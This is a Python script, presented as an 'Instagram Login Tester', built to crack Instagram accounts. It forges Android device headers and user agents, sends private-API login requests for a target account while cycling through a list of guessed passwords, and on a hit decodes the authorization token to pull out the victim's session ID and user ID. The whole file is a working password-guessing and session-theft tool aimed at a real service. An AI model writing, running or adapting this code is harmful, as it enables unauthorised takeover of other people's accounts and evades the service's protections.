import requests
import uuid
import time
import sys
import random
import re
import base64
import urllib.parse
import json
import hashlib
from datetime import datetime
from time import timezone
import os
from typing import Dict, List, Optional

# ==================== LOGGING & DEBUG ====================

class Logger:
    """Custom logging for debugging"""
    COLORS = {
        'SUCCESS': '\033[92m',      # Green
        'ERROR': '\033[91m',        # Red
        'WARNING': '\033[93m',      # Yellow
        'INFO': '\033[94m',         # Blue
        'DEBUG': '\033[95m',        # Magenta
        'RESET': '\033[0m'
    }
    
    @staticmethod
    def success(msg):
        print(f"{Logger.COLORS['SUCCESS']}✓ {msg}{Logger.COLORS['RESET']}")
    
    @staticmethod
    def error(msg):
        print(f"{Logger.COLORS['ERROR']}✗ {msg}{Logger.COLORS['RESET']}")
    
    @staticmethod
    def warning(msg):
        print(f"{Logger.COLORS['WARNING']}⚠ {msg}{Logger.COLORS['RESET']}")
    
    @staticmethod
    def info(msg):
        print(f"{Logger.COLORS['INFO']}ℹ {msg}{Logger.COLORS['RESET']}")
    
    @staticmethod
    def debug(msg):
        print(f"{Logger.COLORS['DEBUG']}⚙ {msg}{Logger.COLORS['RESET']}")

# ==================== UTILITY FUNCTIONS ====================

def Blok_ID():
    """Generate Instagram Bloks Version ID"""
    try:
        session = requests.Session()
        session.headers.update({
            'user-agent': 'Instagram 312.1.0.34.111 Android (30/11; 320dpi; 720x1472; INFINIX MOBILITY LIMITED/Infinix; Infinix X688B; Infinix-X688B; mt6765; en_US; 548323754)'
        })
        response = session.get('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', timeout=5)
        blok_version = re.search(r'bloks_version["\']?\s*:\s*["\']?([a-f0-9]+)', response.text)
        if blok_version:
            Logger.debug(f"Blok ID found: {blok_version.group(1)[:8]}...")
            return blok_version.group(1)
    except Exception as e:
        Logger.warning(f"Failed to fetch Blok ID: {e}")
    
    # Fallback
    fallback = str(uuid.uuid4()).replace('-', '')[:32]
    Logger.debug(f"Using fallback Blok ID: {fallback[:8]}...")
    return fallback

def timezone_offset():
    """Get current timezone offset in seconds"""
    try:
        return -time.timezone if time.daylight == 0 else -time.altzone
    except:
        return 0

def SetMid():
    """Generate Instagram Mid (Machine ID)"""
    return str(uuid.uuid4()).replace('-', '')

def Android_ID(users, pwb):
    """Generate Android Device ID"""
    try:
        combined = f"{users}{pwb}".encode('utf-8')
        return hashlib.md5(combined)
    except:
        return hashlib.md5(str(uuid.uuid4()).encode())

def HeadersApiLogin():
    """Get default API login headers"""
    return {
        'x-bloks-version-id': Blok_ID(),
        'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
        'x-ig-app-id': '3419628305025917',
        'x-ig-device-id': str(uuid.uuid4()),
        'x-ig-family-device-id': str(uuid.uuid4()),
        'x-ig-android-id': f'android-{str(uuid.uuid4())[:16]}'
    }

def AppUac(blok_version):
    """Generate Instagram User-Agent string"""
    ua_strings = [
        'Instagram 312.1.0.34.111 Android (30/11; 320dpi; 720x1472; INFINIX MOBILITY LIMITED/Infinix; Infinix X688B; Infinix-X688B; mt6765; en_US; 548323754)',
        'Instagram 311.0.0.21.112 Android (11; 440dpi; 1080x2340; samsung/SM-G960F; SM-G960F; SM-G960F; exynos9810; en_US; 515395476)',
        'Instagram 310.0.0.18.110 Android (10; 420dpi; 1080x2220; motorola/moto g8 play; moto g8 play; moto g8 play; sdm665; en_US; 497606881)',
    ]
    return random.choice(ua_strings)

def Generate_Device_ID():
    """Generate a complete device ID"""
    return f'android-{hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]}'

def Get_Timezone_Offset():
    """Get timezone offset string"""
    offset = timezone_offset()
    hours = abs(offset) // 3600
    sign = '+' if offset >= 0 else '-'
    return f"{sign}{hours:02d}:00"

def Generate_Session_Headers():
    """Generate complete session headers for Instagram API"""
    device_id = str(uuid.uuid4())
    family_device_id = str(uuid.uuid4())
    response = requests.Session().get('https://www.instagram.com/accounts/login/')
    csrftoken = response.cookies.get('csrftoken')
    
    return {
        'host': 'b.i.instagram.com',
        'x-csrftoken': csrftoken,
        'x-ig-app-locale': 'in_ID',
        'x-ig-device-locale': 'in_ID',
        'x-ig-mapped-locale': 'id_ID',
        'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
        'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
        'x-ig-bandwidth-speed-kbps': str(random.randint(100, 300)),
        'x-ig-bandwidth-totalbytes-b': str(random.randint(500000, 900000)),
        'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 9000)),
        'x-bloks-version-id': Blok_ID(),
        'x-bloks-is-prism-enabled': 'false',
        'x-bloks-is-layout-rtl': 'false',
        'x-ig-device-id': device_id,
        'x-ig-family-device-id': family_device_id,
        'x-ig-android-id': Generate_Device_ID(),
        'x-ig-timezone-offset': str(Get_Timezone_Offset()),
        'x-fb-connection-type': 'MOBILE.LTE',
        'x-ig-connection-type': 'MOBILE(LTE)',
        'x-ig-capabilities': '3brTv10=',
        'x-ig-app-id': '3419628305025917',
        'priority': 'u=3',
        'user-agent': AppUac(Blok_ID()),
        'accept-language': 'id-ID, en-US',
        'x-mid': SetMid(),
        'ig-intended-user-id': '0',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'x-fb-http-engine': 'Liger',
        'x-fb-client-ip': 'True',
        'x-fb-server-cluster': 'True'
    }

def Generate_Login_Payload(uid, pw, session_headers):
    """Generate Instagram login payload"""
    current_time = int(time.time())
    
    payload = {
        "client_input_params": {
            "contact_point": uid,
            "password": f"#PWD_INSTAGRAM:0:{current_time}:{pw}",
            "event_flow": "account_recovery",
            "family_device_id": session_headers['x-ig-family-device-id'],
            "machine_id": session_headers['x-mid'],
            "accounts_list": [],
            "has_whatsapp_installed": 0,
            "login_attempt_count": 1,
            "device_id": session_headers['x-ig-android-id'],
            "headers_infra_flow_id": "",
            "auth_secure_device_id": "",
            "encrypted_msisdn": "",
            "device_emails": [],
            "lois_settings": {
                "lara_override": "",
                "lois_token": ""
            },
            "event_step": "AYMH_PASSWORD_FORM",
            "secure_family_device_id": ""
        },
        "server_params": {
            "is_caa_perf_enabled": 0,
            "is_platform_login": 0,
            "is_from_logged_out": 0,
            "login_credential_type": "none",
            "should_trigger_override_login_2fa_action": 0,
            "is_from_logged_in_switcher": 0,
            "family_device_id": session_headers['x-ig-family-device-id'],
            "credential_type": "password",
            "waterfall_id": str(uuid.uuid4()),
            "password_text_input_id": "4kv99g:38",
            "layered_homepage_experiment_group": None,
            "offline_experiment_group": None,
            "INTERNAL_INFRA_THEME": "harm_f",
            "INTERNAL__latency_qpl_instance_id": 27691536400061,
            "device_id": session_headers['x-ig-android-id'],
            "server_login_source": "device_based_login",
            "login_source": "AccountRecovery",
            "caller": "gslr",
            "should_trigger_override_login_success_action": 0,
            "ar_event_source": "first_password_failure",
            "INTERNAL__latency_qpl_marker_id": 36707139
        }
    }
    return json.dumps(payload)

# ==================== RESPONSE PARSER ====================

def parse_login_response(response_text: str, uid: str) -> Optional[Dict]:
    """Parse Instagram login response"""
    try:
        # Check for success
        if 'logged_in_user' not in response_text.replace('\\', ''):
            Logger.debug(f"No 'logged_in_user' in response for {uid}")
            return None
        
        Logger.debug("Found 'logged_in_user' in response")
        
        # Extract authorization token
        auth_match = re.search(
            r'"headers":"{"IG-Set-Authorization": "(.*?)"',
            response_text.replace('\\', '')
        )
        
        if not auth_match:
            Logger.warning("Could not find IG-Set-Authorization header")
            return None
        
        cok = auth_match.group(1)
        Logger.debug(f"Authorization token found (length: {len(cok)})")
        
        # Decode token
        try:
            xyz = base64.b64decode(cok.split(':')[2]).decode()
            Logger.debug("Token decoded successfully")
        except Exception as e:
            Logger.error(f"Failed to decode token: {e}")
            return None
        
        # Extract user ID
        ds_match = re.search('{"ds_user_id":"(\d+)"', str(xyz))
        if not ds_match:
            Logger.warning("Could not extract ds_user_id")
            return None
        
        ds_id = ds_match.group(1)
        Logger.debug(f"User ID: {ds_id}")
        
        # Extract session ID
        sn_match = re.search('"sessionid":"(.*?)"', str(xyz))
        if not sn_match:
            Logger.warning("Could not extract sessionid")
            return None
        
        sn_id = sn_match.group(1)
        Logger.debug(f"Session ID: {sn_id[:16]}...")
        
        return {
            "ds_user_id": ds_id,
            "sessionid": sn_id,
            "username": uid
        }
        
    except Exception as e:
        Logger.error(f"Response parsing error: {e}")
        return None

# ==================== MAIN CRACK FUNCTION ====================

def crack(uid, pww, total_idz):
    global loop
    global oks
    global cps
    
    Logger.info(f"Starting login attempt for: {uid}")
    Logger.info(f"Testing {len(pww)} passwords")
    
    try:
        for idx, pw in enumerate(pww, 1):
            try:
                Logger.info(f"Password {idx}/{len(pww)}: {pw}")
                
                # Generate headers
                headers = Generate_Session_Headers()
                session = requests.Session()
                session.headers.update(headers)
                
                # Create payload
                payload_json = Generate_Login_Payload(uid, pw, headers)
                
                query_data = {
                    'params': payload_json,
                    'bk_client_context': json.dumps({
                        "bloks_version": headers['x-bloks-version-id'],
                        "styles_id": "instagram"
                    }),
                    'bloks_versioning_id': headers['x-bloks-version-id']
                }
                
                Query = 'params=%s&bk_client_context=%s&bloks_versioning_id=%s' % (
                    urllib.parse.quote(query_data['params']),
                    urllib.parse.quote(query_data['bk_client_context']),
                    query_data['bloks_versioning_id']
                )
                
                Logger.debug("Sending login request...")
                
                # Send request
                Response = requests.post(
                    'https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',
                    data=Query,
                    allow_redirects=True,
                    timeout=15
                )
                
                Logger.debug(f"Response status: {Response.status_code}")
                Logger.debug(f"Response length: {len(Response.text)} characters")
                
                # Log response for debugging
                if Response.status_code != 200:
                    Logger.warning(f"HTTP {Response.status_code}: {Response.text[:100]}")
                
                # Parse response
                result = parse_login_response(Response.text, uid)
                
                if result:
                    Logger.success(f"LOGIN SUCCESSFUL! {result}")
                    oks.append(result)
                    return True
                else:
                    Logger.warning(f"Login failed for password: {pw}")
                    cps.append(f"{uid}:{pw}")
                    
            except requests.exceptions.Timeout:
                Logger.error(f"Request timeout for password: {pw}")
                time.sleep(random.uniform(1, 3))
                
            except requests.exceptions.ConnectionError:
                Logger.error("Connection error - checking internet...")
                time.sleep(random.uniform(2, 5))
                
            except Exception as e:
                Logger.error(f"Error with password {pw}: {str(e)[:100]}")
                
            # Delay between attempts
            time.sleep(random.uniform(0.5, 2))
                
    except Exception as e:
        Logger.error(f"Critical error in crack function: {e}")
        return False

# ==================== MAIN EXECUTION ====================

if __name__ == "__main__":
    # Initialize global variables
    loop = 0
    oks = []
    cps = []
    
    Logger.info("=" * 50)
    Logger.info("Instagram Login Tester v2.0")
    Logger.info("=" * 50)
    
    # Example usage
    uid = "8389066877"  # Username, email, or phone
    pww = ["sumon@12", "sumon@12M", "sumon@12B"]
    total_idz = len(pww)
    
    Logger.info(f"Target: {uid}")
    Logger.info(f"Passwords to test: {len(pww)}")
    
    success = crack(uid, pww, total_idz)
    
    Logger.info("=" * 50)
    Logger.info(f"Results: {len(oks)} successful, {len(cps)} failed")
    Logger.info("=" * 50)
    
    if oks:
        Logger.success("Successful logins:")
        for result in oks:
            print(f"  • {result}")
    
    if cps:
        Logger.warning(f"Failed attempts: {len(cps)}")
